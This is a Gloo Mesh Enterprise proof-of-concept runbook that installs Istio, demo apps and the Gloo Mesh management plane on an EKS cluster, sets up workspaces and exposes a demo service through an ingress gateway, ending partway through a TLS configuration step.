
<!--bash
#!/usr/bin/env bash

source ./scripts/assert.sh
-->



![Gloo Mesh Enterprise](images/gloo-mesh-enterprise.png)
# <center>Gloo Gateway POC Runbook</center>

## Table of Contents
* [Introduction to Gloo Mesh](#introduction)
* [Lab 0 - Prerequisites](#Lab-0)
* [Lab 1 - Setting up your Environment Variables](#Lab-1)
* [Lab 2 - Deploy Istio](#Lab-2)
* [Lab 3 - Deploy our bookinfo and httpbin demo apps](#Lab-3)
* [Lab 4 - Deploy and register Gloo Mesh](#Lab-4)
* [Lab 5 - Create Gloo Mesh Workspaces](#Lab-5)
* [Lab 6 - Expose the productpage through a gateway](#Lab-6)
* [Lab 7 - Canary deployment with traffic shifting](#Lab-7)
* [Lab 8 - Traffic policies](#Lab-8)
* [Lab 9 - Expose an external service](#Lab-9)
* [Lab 10 - Implement Rate Limiting policy on httpbin](#Lab-10)
* [Lab 11 - Use the Transformation filter](#Lab-11)
* [Lab 12 - Use the Web Application Firewall filter](#Lab-12)
* [Lab 13 - Exploring the Gloo Mesh Enterprise UI](#Lab-13)
* [Lab 14 - Exposing the Gloo Mesh UI](#Lab-14)
* [Lab 15 - Integrate Gloo Mesh UI with OIDC](#Lab-15)
* [Lab 16 - Securing Application access with OAuth](#Lab-16)
* [Lab 17 - Integrating with OPA](#Lab-17)
* [Lab 18 - Use the JWT filter to create headers from claims](#Lab-18)
* [Lab 19 - Use the transformation filter to manipulate headers](#Lab-19)
* [Lab 20 - Implement OPA on new validated/transformed claims](#Lab-20)
* [Lab 21 - Route Table Delegation](#Lab-21)
* [Lab 22 - Access Logging](#Lab-22)



## Introduction to Gloo Mesh <a name="introduction"></a>
[Gloo Mesh Enterprise](https://www.solo.io/products/gloo-mesh/) is a management plane which makes it easy to operate [Istio](https://istio.io) on one or many Kubernetes clusters deployed anywhere (any platform, anywhere).

![Gloo Mesh Dashboard](images/runbook7a.png)

### Istio support
The Gloo Mesh Enterprise subscription includes end to end Istio support:
- Upstream first
- Specialty builds available (FIPS, ARM, etc)
- Long Term Support (LTS) N-4 
- Critical security patches
- Production break-fix
- One hour SLA Severity 1
- Install / upgrade
- Architecture and operational guidance, best practices

### Gloo Mesh overview
Gloo Mesh provides many unique features, including:
- multi-tenancy based on global workspaces
- zero trust enforcement
- global observability (centralized metrics and access logging)
- simplified cross cluster communications (using virtual destinations)
- advanced gateway capabilities (oauth, jwt, transformations, rate limiting, web application firewall, ...)

### Gloo Gateway overview
Gloo Mesh Gateway is an abstraction built on Istio's ingress gateway model, which uses an Envoy proxy as the ingress gateway into and out of your multicluster service mesh environment. Gloo Mesh adds powerful multicluster, multimesh capabilities. You use custom resources such as Gloo Mesh virtual gateways, route tables, and policies to simplify configuring ingress traffic rules. You can even reuse the same external auth, rate limiting, and policies as for your east-west traffic.

### High Level Diagram
A high level diagram of the base components in our single Kubernetes cluster is shown below. We will expand on this diagram as we move along with the labs
![Gloo Mesh Workshop Environment](images/runbook1b.png)

## Lab 0 - Prerequisites <a name="Lab-0"></a>

### HIGHLY RECOMMENDED: Read Before Starting the Labs Below:
Before you start running through the Labs below, it is highly recommended to read the About and Concepts sections linked below. Here you will begin to learn the high level value add that Gloo Mesh and Gloo Gateway brings to your Kubernetes architecture. Understanding of the concepts and architecture of Gloo Gateway will help us greatly as we move along the hands-on labs.

[Gloo Mesh Docs - Concepts](https://docs.solo.io/gloo-mesh-enterprise/main/concepts/)

[Gloo Mesh Docs - About Gloo Mesh Gateway](https://docs.solo.io/gloo-mesh-enterprise/main/concepts/gateway/)

[Gloo Mesh Docs - Routing requests Overview](https://docs.solo.io/gloo-mesh-enterprise/main/routing/)

[Gloo Mesh Docs - Gloo Mesh Policies](https://docs.solo.io/gloo-mesh-enterprise/main/policies/)

[Gloo Mesh Docs - Workspaces](https://docs.solo.io/gloo-mesh-enterprise/main/concepts/multi-tenancy/)

### Prerequisites
This POC runbook assumes the following:
- 1x clusters deployed on EKS (m5.2xlarge instance size)
- AWS NLB Controller deployed on cluster

## Lab 1 - Setting up your Environment Variables <a name="Lab-1"></a>
Set the GLOO_MESH_LICENSE_KEY environment variable before starting:
```bash
export GLOO_MESH_LICENSE_KEY="<INSERT_LICENSE_KEY_HERE>"
```

Set the context environment variables:
```bash
export MGMT=mgmt
```

You also need to rename the Kubernete contexts of each Kubernetes cluster to match `mgmt`

Here is an example showing how to rename a Kubernetes context:
```
kubectl config rename-context <context to rename> <new context name>
```

Run the following command to make `mgmt` the current cluster.
```bash
kubectl config use-context ${MGMT}
```

> If you prefer to use the existing context name, just set the variables as so:
> ```
> export MGMT=<cluster_mgmt_context>
> ```
>
> Note: these variables may need to be set in each new terminal used


## Lab 2 - Deploy Istio <a name="Lab-2"></a>
We are going to deploy Istio using Helm, but there are several other options. You can find more information in the [Istio documentation](https://istio.io/latest/docs/setup/install/).

First of all, let's Download the Istio release 1.13.4:
```bash
export ISTIO_VERSION=1.13.4
curl -L https://istio.io/downloadIstio | sh -
```

Then, you need to create the `istio-system` and the `istio-gateways` namespaces on the first cluster.
```bash
kubectl --context ${MGMT} create ns istio-system
kubectl --context ${MGMT} create ns istio-gateways
```

Now, let's deploy the Istio control plane on the cluster:
```bash
helm --kube-context=${MGMT} upgrade --install istio-base ./istio-1.13.4/manifests/charts/base -n istio-system

helm --kube-context=${MGMT} upgrade --install istio-1.13.4 ./istio-1.13.4/manifests/charts/istio-control/istio-discovery -n istio-system --values - <<EOF
revision: 1-13
global:
  meshID: mesh1
  multiCluster:
    clusterName: mgmt
  network: network1
  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
  tag: 1.13.4-solo
meshConfig:
  trustDomain: mgmt
  accessLogFile: /dev/stdout
  enableAutoMtls: true
  defaultConfig:
    envoyMetricsService:
      address: gloo-mesh-agent.gloo-mesh:9977
    envoyAccessLogService:
      address: gloo-mesh-agent.gloo-mesh:9977
    proxyMetadata:
      ISTIO_META_DNS_CAPTURE: "true"
      ISTIO_META_DNS_AUTO_ALLOCATE: "true"
      GLOO_MESH_CLUSTER_NAME: mgmt
pilot:
  env:
    PILOT_ENABLE_K8S_SELECT_WORKLOAD_ENTRIES: "false"
    PILOT_SKIP_VALIDATE_TRUST_DOMAIN: "true"
EOF
```

After that, you can deploy the gateway(s):
```bash
kubectl --context ${MGMT} label namespace istio-gateways istio.io/rev=1-13

helm --kube-context=${MGMT} upgrade --install istio-ingressgateway ./istio-1.13.4/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
global:
  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
  tag: 1.13.4-solo
gateways:
  istio-ingressgateway:
    name: istio-ingressgateway
    namespace: istio-gateways
    labels:
      istio: ingressgateway
    injectionTemplate: gateway
    type: LoadBalancer
    ports:
    - name: http2
      port: 80
      targetPort: 8080
    - name: https
      port: 443
      targetPort: 8443
    serviceAnnotations:
      meta.helm.sh/release-name: istio-ingressgateway
      meta.helm.sh/release-namespace: istio-gateways
      # uncomment below if using NLB controller
      #service.beta.kubernetes.io/aws-load-balancer-backend-protocol: TCP
      #service.beta.kubernetes.io/aws-load-balancer-healthcheck-healthy-threshold: "2"
      #service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval: "10"
      #service.beta.kubernetes.io/aws-load-balancer-healthcheck-port: "15021"
      #service.beta.kubernetes.io/aws-load-balancer-healthcheck-protocol: tcp
      #service.beta.kubernetes.io/aws-load-balancer-healthcheck-unhealthy-threshold: "2"
      #service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
      #service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
      #service.beta.kubernetes.io/aws-load-balancer-type: nlb-ip
      # uncomment below if using classic LB controller
      service.beta.kubernetes.io/aws-load-balancer-type: external
      service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
      service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
EOF
```

As you can see, we deploy the control plane (istiod) in the `istio-system` and the ingress gateway in the `istio-gateways` namespace.

Note that we set the `trust domain` to be the same as the cluster name and we configure the sidecars to send their metrics and access logs to the Gloo Mesh agent.

Run the following command until all the Istio Pods are ready:
```bash
kubectl --context ${MGMT} get pods -n istio-system && kubectl --context ${MGMT} get pods -n istio-gateways
```

When they are ready, you should get this output:
```
NAME                      READY   STATUS    RESTARTS   AGE
istiod-5c669bcf6f-2hn6c   1/1     Running   0          3m7s
NAME                                     READY   STATUS    RESTARTS   AGE
istio-ingressgateway-744fcf4fb-5dc7q     1/1     Running   0          2m44s
```

Set the environment variable for the service corresponding to the Istio Ingress Gateway of the cluster(s):
```bash
export ENDPOINT_HTTP_GW_MGMT=$(kubectl --context ${MGMT} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):80
export ENDPOINT_HTTPS_GW_MGMT=$(kubectl --context ${MGMT} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):443
export HOST_GW_MGMT=$(echo ${ENDPOINT_HTTP_GW_MGMT} | cut -d: -f1)
```

Check that the variables have correct values:
```
echo $ENDPOINT_HTTP_GW_MGMT
echo $ENDPOINT_HTTPS_GW_MGMT
```

> ### Deploying an east/west gateway
> Since we are only using one cluster in this workshop, there is no need for us to deploy an Istio Ingressgateway to serve east/west traffic for cross-cluster communication. But just for completeness the helm command is provided below
> 
> ```
> helm --kube-context=${MGMT} upgrade --install istio-eastwestgateway ./istio-1.13.4/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
> global:
>   hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
>   tag: 1.13.4-solo
> gateways:
>   istio-ingressgateway:
>     name: istio-eastwestgateway
>     namespace: istio-gateways
>     labels:
>       istio: eastwestgateway
>       topology.istio.io/network: network1
>     injectionTemplate: gateway
>     type: LoadBalancer
>     ports:
>     - name: tcp-status-port
>       port: 15021
>       targetPort: 15021
>     - name: tls
>       port: 15443
>       targetPort: 15443
>     - name: tcp-istiod
>       port: 15012
>       targetPort: 15012
>     - name: tcp-webhook
>       port: 15017
>       targetPort: 15017
>     env:
>       ISTIO_META_ROUTER_MODE: "sni-dnat"
>       ISTIO_META_REQUESTED_NETWORK_VIEW: "network1"
> EOF
> ```

## Lab 3 - Deploy our bookinfo and httpbin demo apps <a name="Lab-3"></a>
We're going to deploy the bookinfo and httpbin applications to demonstrate several features of Istio and Gloo Mesh.

You can find more information about the bookinfo application [here](https://istio.io/latest/docs/examples/bookinfo/)
You can find more information about the httpbin application [here](https://github.com/postmanlabs/httpbin)

### Deploying bookinfo
Run the following commands to deploy the bookinfo application on `mgmt`:
```bash
kubectl --context ${MGMT} create ns bookinfo-frontends
kubectl --context ${MGMT} create ns bookinfo-backends
curl https://raw.githubusercontent.com/istio/istio/release-1.13/samples/bookinfo/platform/kube/bookinfo.yaml > bookinfo.yaml
kubectl --context ${MGMT} label namespace bookinfo-frontends istio.io/rev=1-13
kubectl --context ${MGMT} label namespace bookinfo-backends istio.io/rev=1-13
# deploy the frontend bookinfo service in the bookinfo-frontends namespace
kubectl --context ${MGMT} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
kubectl --context ${MGMT} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
kubectl --context ${MGMT} -n bookinfo-backends apply -f bookinfo.yaml -l 'account in (reviews,ratings,details)'
kubectl --context ${MGMT} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details),version notin (v3)'
# Update the productpage deployment to set the environment variables to define where the backend services are running
kubectl --context ${MGMT} -n bookinfo-frontends set env deploy/productpage-v1 DETAILS_HOSTNAME=details.bookinfo-backends.svc.cluster.local
kubectl --context ${MGMT} -n bookinfo-frontends set env deploy/productpage-v1 REVIEWS_HOSTNAME=reviews.bookinfo-backends.svc.cluster.local
# Update the reviews service to display where it is coming from
kubectl --context ${MGMT} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${MGMT}
kubectl --context ${MGMT} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${MGMT}
```

You can check that the app is running using the following command:
```
kubectl --context ${MGMT} -n bookinfo-frontends get pods && kubectl --context ${MGMT} -n bookinfo-backends get pods
```

Output should look similar to below
```
NAME                              READY   STATUS    RESTARTS   AGE
productpage-v1-7654c7546b-7kztp   2/2     Running   0          32m
NAME                          READY   STATUS    RESTARTS   AGE
details-v1-5498c86cf5-tx9f9   2/2     Running   0          32m
ratings-v1-b477cf6cf-fk5rv    2/2     Running   0          32m
reviews-v1-79d546878f-kcc25   2/2     Running   0          32m
reviews-v2-548c57f459-8xh7n   2/2     Running   0          32m
```

Note that we deployed the `productpage` service in the `bookinfo-frontends` namespace and the other services in the `bookinfo-backends` namespace.

And we deployed the `v1` and `v2` versions of the `reviews` microservice, not the `v3` version.

### Deploying httpbin
Now we're going to deploy the httpbin application

Run the following commands to deploy the httpbin app on `mgmt` twice.

The first version will be called `not-in-mesh` and won't have the sidecar injected (because we don't label the namespace).
```bash
kubectl --context ${MGMT} create ns httpbin

kubectl --context ${MGMT} apply -n httpbin -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: not-in-mesh
---
apiVersion: v1
kind: Service
metadata:
  name: not-in-mesh
  labels:
    app: not-in-mesh
    service: not-in-mesh
spec:
  ports:
  - name: http
    port: 8000
    targetPort: 80
  selector:
    app: not-in-mesh
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: not-in-mesh
spec:
  replicas: 1
  selector:
    matchLabels:
      app: not-in-mesh
      version: v1
  template:
    metadata:
      labels:
        app: not-in-mesh
        version: v1
    spec:
      serviceAccountName: not-in-mesh
      containers:
      - image: docker.io/kennethreitz/httpbin
        imagePullPolicy: IfNotPresent
        name: not-in-mesh
        ports:
        - containerPort: 80
EOF
```

The second version will be called `in-mesh` and will have the sidecar injected (because of the label `istio.io/rev` in the Pod template).
```bash
kubectl --context ${MGMT} apply -n httpbin -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: in-mesh
---
apiVersion: v1
kind: Service
metadata:
  name: in-mesh
  labels:
    app: in-mesh
    service: in-mesh
spec:
  ports:
  - name: http
    port: 8000
    targetPort: 80
  selector:
    app: in-mesh
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: in-mesh
spec:
  replicas: 1
  selector:
    matchLabels:
      app: in-mesh
      version: v1
  template:
    metadata:
      labels:
        app: in-mesh
        version: v1
        istio.io/rev: 1-13
    spec:
      serviceAccountName: in-mesh
      containers:
      - image: docker.io/kennethreitz/httpbin
        imagePullPolicy: IfNotPresent
        name: in-mesh
        ports:
        - containerPort: 80
EOF
```

You can check that the app is running using
```
kubectl --context ${MGMT} -n httpbin get pods
```

Output should look similar to below
```
NAME                           READY   STATUS    RESTARTS   AGE
in-mesh-5d9d9549b5-qrdgd       2/2     Running   0          11s
not-in-mesh-5c64bb49cd-m9kwm   1/1     Running   0          11s
```

## Lab 4 - Deploy and register Gloo Mesh <a name="Lab-4"></a>

### Install the meshctl CLI
First of all, let's install the `meshctl` CLI which will provide us some added functionality for interacting with Gloo Mesh
```bash
export GLOO_MESH_VERSION=v2.1.0-beta27
curl -sL https://run.solo.io/meshctl/install | sh -
export PATH=$HOME/.gloo-mesh/bin:$PATH
```

### Deploy Gloo Mesh with Helm
Run the following commands to deploy the Gloo Mesh management plane:
```bash
helm repo add gloo-mesh-enterprise https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-enterprise 
helm repo update
kubectl --context ${MGMT} create ns gloo-mesh 
helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise \
--namespace gloo-mesh --kube-context ${MGMT} \
--version=2.1.0-beta27 \
--values - <<EOF
licenseKey: "${GLOO_MESH_LICENSE_KEY}"
global:
  cluster: mgmt
mgmtClusterName: mgmt
glooMeshMgmtServer:
  resources:
    requests:
      cpu: 125m
      memory: 256Mi
    limits:
      cpu: 1000m
      memory: 1Gi
  ports:
    healthcheck: 8091
    grpc: 9900
  serviceType: ClusterIP
  # Additional settings to add to the load balancer service if configuring a multi-cluster setup
  #serviceType: LoadBalancer
  #serviceOverrides:
  #  metadata:
  #    annotations:
  #      # AWS-specific annotations
  #      service.beta.kubernetes.io/aws-load-balancer-healthcheck-healthy-threshold: "2"
  #      service.beta.kubernetes.io/aws-load-balancer-healthcheck-unhealthy-threshold: "2"
  #      service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval: "10"
  #      service.beta.kubernetes.io/aws-load-balancer-healthcheck-port: "9900"
  #      service.beta.kubernetes.io/aws-load-balancer-healthcheck-protocol: "tcp"
  #      service.beta.kubernetes.io/aws-load-balancer-type: external
  #      service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
  #      service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
  #      service.beta.kubernetes.io/aws-load-balancer-backend-protocol: TCP
  #      service.beta.kubernetes.io/aws-load-balancer-name: solo-poc-gloo-mesh-mgmt-server
  relay:
    disableCA: false
    disableCACertGeneration: false
glooMeshUi:
  serviceType: ClusterIP
  resources:
    requests:
      cpu: 125m
      memory: 256Mi
    limits:
      cpu: 500m
      memory: 512Gi
rbac-webhook:
  enabled: false
glooMeshRedis:
  resources:
    requests:
      cpu: 125m
      memory: 256Mi
    limits:
      cpu: 500m
      memory: 512Gi
prometheus:
  enabled: true
  server:
    resources:
      requests:
        cpu: 125m
        memory: 256Mi
      limits:
        cpu: 500m
        memory: 512Gi
EOF

kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
```

### Register your clusters with Helm
Finally, you need to register the cluster(s).

Here is how you register:
```bash
helm repo add gloo-mesh-agent https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-agent
helm repo update

kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: KubernetesCluster
metadata:
  name: mgmt
  namespace: gloo-mesh
spec:
  clusterDomain: cluster.local
EOF

helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
  --namespace gloo-mesh \
  --kube-context=${MGMT} \
  --set relay.serverAddress="gloo-mesh-mgmt-server.gloo-mesh.svc.cluster.local:9900" \
  --set relay.authority=gloo-mesh-mgmt-server.gloo-mesh \
  --set rate-limiter.enabled=false \
  --set ext-auth-service.enabled=false \
  --set cluster=mgmt \
  --version 2.1.0-beta27
```

Note that the registration can also be performed using `meshctl cluster register`.

### Validate that your clusters have been registered
You can check the cluster(s) have been registered correctly using the following commands:

Method #1: Port-forward to gloo-mesh-mgmt-server admin page

In the terminal, run the port-forward command below to expose the metrics endpoint
```
kubectl port-forward -n gloo-mesh --context ${MGMT} deploy/gloo-mesh-mgmt-server 9091
```

In your browser, connect to http://localhost:9091/metrics

In the metrics UI, look for the following lines. If the values are 1, the agents in the workload clusters are successfully registered with the management server. If the values are 0, the agents are not successfully connected.
```
# HELP relay_pull_clients_connected Current number of connected Relay pull clients (Relay Agents).
# TYPE relay_pull_clients_connected gauge
relay_pull_clients_connected{cluster="mgmt"} 1
# HELP relay_push_clients_connected Current number of connected Relay push clients (Relay Agents).
# TYPE relay_push_clients_connected gauge
relay_push_clients_connected{cluster="mgmt"} 1
# HELP relay_push_clients_warmed Current number of warmed Relay push clients (Relay Agents).
# TYPE relay_push_clients_warmed gauge
relay_push_clients_warmed{cluster="mgmt"} 1
```

Method #2: With Ephemeral Containers feature-flag enabled:
```
pod=$(kubectl --context ${MGMT} -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${MGMT} -n gloo-mesh debug -q -i ${pod} --image=curlimages/curl -- curl -s http://localhost:9091/metrics | grep relay_push_clients_connected
```

You should get an output similar to this:

```
# HELP relay_push_clients_connected Current number of connected Relay push clients (Relay Agents).
# TYPE relay_push_clients_connected gauge
relay_push_clients_connected{cluster="mgmt"} 1
```

Method #3: Visualize in the UI

To open a port-forward to the Gloo Mesh UI you can either use `meshctl` or `kubectl` commands

meshctl:
```
meshctl dashboard --kubecontext ${MGMT}
```

kubectl:
```
kubectl port-forward -n gloo-mesh svc/gloo-mesh-ui 8090 --context ${MGMT}
```

If agents were successfully registered, you should see information in the Clusters section of the Overview page.

### Installing the Gloo Mesh Addons
To use the Gloo Mesh Gateway advanced features (external authentication, rate limiting, ...), you need to install the Gloo Mesh addons.

First, you need to create a namespace for the addons, with Istio injection enabled:
```bash
kubectl --context ${MGMT} create namespace gloo-mesh-addons
```

Then, you can deploy the addons on the cluster(s) using Helm:
```bash
helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
  --namespace gloo-mesh-addons \
  --kube-context=${MGMT} \
  --set glooMeshAgent.enabled=false \
  --set rate-limiter.enabled=true \
  --set ext-auth-service.enabled=true \
  --version 2.1.0-beta27
```

This is how the environment looks like now:
![Gloo Mesh Workshop Environment](images/runbook1b.png)

## Lab 5 - Create Gloo Mesh Workspaces <a name="Lab-5"></a>
Gloo Mesh introduces a new concept, the Workspace custom resource. A workspace consists of one or more Kubernetes namespaces that are in one or more clusters. Think of a workspace as the boundary of your team's resources. To get started, create a workspace for each of your teams. Your teams might start with their apps in a couple Kubernetes namespaces in a single cluster. As your teams scale across namespaces and clusters, their workspaces scale with them

> ### Setting a Wildcard Workspace
> The lab example below is provided to demonstrate the Workspaces concept and how it can provide strict multitenancy controls within the cluster as well as across multiple clusters. If you were to prefer starting with a wide-open `wildcard` workspace it is also possible with the config below.
> 
>```
>apiVersion: admin.gloo.solo.io/v2
>kind: Workspace
>metadata:
>  name: wildcard
>  namespace: gloo-mesh
>spec:
>  workloadClusters:
>  - name: '*'
>    namespaces:
>    - name: '*'
>---
>apiVersion: admin.gloo.solo.io/v2
>kind: WorkspaceSettings
>metadata:
>  name: wildcard
>  namespace: gloo-mesh
>spec:
>  exportTo:
>  - workspaces:
>    - name: '*'
>  importFrom:
>  - workspaces:
>    - name: '*'
>```
>
> **Note: If you have decided to go with a wildcard workspace for your cluster, you can skip forward to Lab 6**

### Create the admin Workspace
First we are going to create a new workspace that we will name the Admin Workspace. In this workspace we will put management tools such as the gloo-mesh namespace (or in future tools like argocd, for example)

Next we're going to create a workspace for the team in charge of the Gloo Mesh platform which corresponds to the `gloo-mesh` namespace on the cluster(s):
```
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  labels:
    allow_ingress: "true"
  name: admin-workspace
  namespace: gloo-mesh
spec:
  workloadClusters:
  - name: mgmt
    namespaces:
    - name: gloo-mesh
---
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: admin-workspace-settings
  namespace: gloo-mesh
spec:
  exportTo:
  - resources:
    - kind: ALL
      labels:
        expose: "true"
    - kind: SERVICE
      labels:
        app: gloo-mesh-ui
    workspaces:
    workspaces:
    - name: gateways
  importFrom:
  - resources:
    - kind: SERVICE
    workspaces:
    - name: gateways
  options:
    federation:
      enabled: true
      hostSuffix: global
EOF
```

The Gloo Mesh admin team has decided to export the following to the `gateway` workspace (using a reference):
- the `gloo-mesh-ui` Kubernetes service
- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`

### Create the Gateways Workspace
Next we're going to create a workspace for the team in charge of the Gateways which corresponds to the `istio-gateways` and the `gloo-mesh-addons` namespaces on the cluster(s):
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: gateways
  namespace: gloo-mesh
spec:
  workloadClusters:
  - name: mgmt
    namespaces:
    - name: istio-gateways
    - name: gloo-mesh-addons
EOF
```

Then, the Gateway team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `gateways` workspace (so the `istio-gateways` or the `gloo-mesh-addons` namespace):
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: gateways
  namespace: istio-gateways
spec:
  importFrom:
  - workspaces:
    - selector:
        allow_ingress: "true"
    resources:
    - kind: SERVICE
    - kind: ALL
      labels:
        expose: "true"
  exportTo:
  - workspaces:
    - selector:
        allow_ingress: "true"
    resources:
    - kind: SERVICE
EOF
```

The Gateway team has decided to import the following from the workspaces that have the label `allow_ingress` set to `true` (using a selector):
- all the Kubernetes services exported by these workspaces
- all the resources (RouteTables, VirtualDestination, ...) exported by these workspaces that have the label `expose` set to `true`

### Create the bookinfo Workspace
Now we're going to create a workspace for the team in charge of the Bookinfo application which corresponds to the `bookinfo-frontends` and `bookinfo-backends` namespaces on the cluster(s):
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: bookinfo
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: mgmt
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
EOF
```

Then, the Bookinfo team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `bookinfo` workspace (so the `bookinfo-frontends` or the `bookinfo-backends` namespace):
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: bookinfo
  namespace: bookinfo-frontends
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: productpage
    - kind: SERVICE
      labels:
        app: reviews
    - kind: ALL
      labels:
        expose: "true"
EOF
```

The Bookinfo team has decided to export the following to the `gateway` workspace (using a reference):
- the `productpage` and the `reviews` Kubernetes services
- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`

### Create the httpbin Workspace
Lastly in the later labs we will use the `httpbin` application to demonstrate some more gateway features so we're going to create a workspace for the team in charge of the httpbin application in advance which corresponds to the `httpbin` namespace on the cluster(s):
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: httpbin
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: mgmt
    namespaces:
    - name: httpbin
EOF
```

Then, the httpbin team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `httpbin` workspace:
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: httpbin
  namespace: httpbin
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: in-mesh
    - kind: ALL
      labels:
        expose: "true"
EOF
```

The Httpbin team has decided to export the following to the `gateway` workspace (using a reference):
- the `in-mesh` Kubernetes service
- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`

This is how to environment looks like with the workspaces:

![Gloo Mesh Workspaces](images/runbook2b.png)


## Lab 6 - Expose the productpage through a gateway <a name="Lab-6"></a>

In this step, we're going to expose the `productpage` service through the Ingress Gateway using Gloo Mesh.

The Gateway team must create a `VirtualGateway` to configure the Istio Ingress Gateway in mgmt to listen to incoming requests.

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw-80
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
        cluster: mgmt
  listeners: 
    - http: {}
      port:
        number: 80
      allowedRouteTables:
        - host: '*'
EOF
```

Then, the Bookinfo team can create a `RouteTable` to determine how they want to handle the traffic.

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-80
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: productpage
      matchers:
      - uri:
          exact: /productpage
      - uri:
          prefix: /static
      - uri:
          exact: /login
      - uri:
          exact: /logout
      - uri:
          prefix: /api/v1/products
      forwardTo:
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
            port:
              number: 9080
EOF
```

You should now be able to access the `productpage` application through the browser.

Get the URL to access the `productpage` service using the following command:
```
echo "http://${ENDPOINT_HTTP_GW_MGMT}/productpage"
```

Gloo Mesh translates the `VirtualGateway` and `RouteTable` into the corresponding Istio objects (`Gateway` and `VirtualService`).

Now, let's secure the access through TLS.

Let's first create a private key and a self-signed certificate:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
   -keyout tls.key -out tls.crt -subj "/CN=*"
```

Then, you have to store them in a Kubernetes secrets running the following commands:

```bash
kubectl --context ${MGMT} -n istio-gateways create secret generic tls-secret \
--from-file=tls.key=tls.key \
--from-file=tls.crt=tls.crt
```

Now the Gateway team needs to create a new `VirtualGateway` that uses this secret:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw-443
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
        cluster: mgmt
  listeners: 
    - http: {}
# ---------------- SSL config ---------------------------
      port:
        number: 443
      tls:
        mode: SIMPLE
        secretName: tls-secret
# -------------------------------------------------------
      allowedRouteTables:
        - host: '*'
EOF
```

Now we can update the `RouteTable` to use the new gateway created on port 443

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
